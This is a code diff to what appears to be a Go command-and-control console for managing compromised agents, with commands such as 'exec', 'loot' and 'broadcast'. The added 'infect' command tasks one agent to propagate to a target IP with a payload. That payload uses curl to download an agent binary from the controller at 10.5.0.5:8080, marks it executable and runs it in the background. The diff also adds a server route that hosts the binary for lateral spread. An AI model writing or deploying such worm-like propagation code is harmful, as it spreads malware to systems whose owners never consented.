@@ -42,7 +42,7 @@ var (
 	// Command History & Autocomplete
 	cmdHistory    []string
 	historyIdx    = -1
-	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit"}
+	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect"}
 
 	// UI Components
 	app          *tview.Application
@@ -126,7 +126,6 @@ func LogHeartbeat(transport string, t Telemetry) {
 		refreshAgentTable()
 		ts := arrival.Format("15:04:05")
 
-		// Corregida sintaxis de bloques if/else
 		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
 			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ EXEC_SUCCESS ][-:-] [blue]%s[white] > %s\n",
 				ts, t.AgentID, t.ArtifactPreview[4:])
@@ -340,6 +339,23 @@ func handleCommand(cmd string) {
 		taskMutex.Unlock()
 		agentMutex.Unlock()
 		fmt.Fprintf(agentLog, "[%s] [yellow]BROADCAST_SENT >[white] Tasked %d nodes with: %s\n", ts, count, command)
+	case "infect":
+		if len(fields) < 3 {
+			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: infect <SourceID> <TargetIP>\n", ts)
+			return
+		}
+		sourceID := fields[1]
+		targetIP := fields[2]
+		
+		// Payload: Download from C2, make executable, and run in background
+		payloadCmd := fmt.Sprintf("curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent && chmod +x /tmp/h-agent && /tmp/h-agent &")
+		
+		taskMutex.Lock()
+		agentTasks[sourceID] = fmt.Sprintf("PROPAGATE %s %s", targetIP, payloadCmd)
+		taskMutex.Unlock()
+		
+		fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to infect %s\n", 
+			ts, sourceID, targetIP)
 	case "clear":
 		agentLog.Clear()
 	case "exit":
@@ -460,6 +476,10 @@ func main() {
 
 	gin.SetMode(gin.ReleaseMode)
 	r := gin.New()
+
+	// Serve the compiled agent binary for lateral propagation
+	r.StaticFile("/dist/hydra-agent", "./bin/hydra-agent")
+
 	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
 		if c.GetHeader("Authorization") != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
 			c.JSON(401, gin.H{"error": "Unauthorized"})
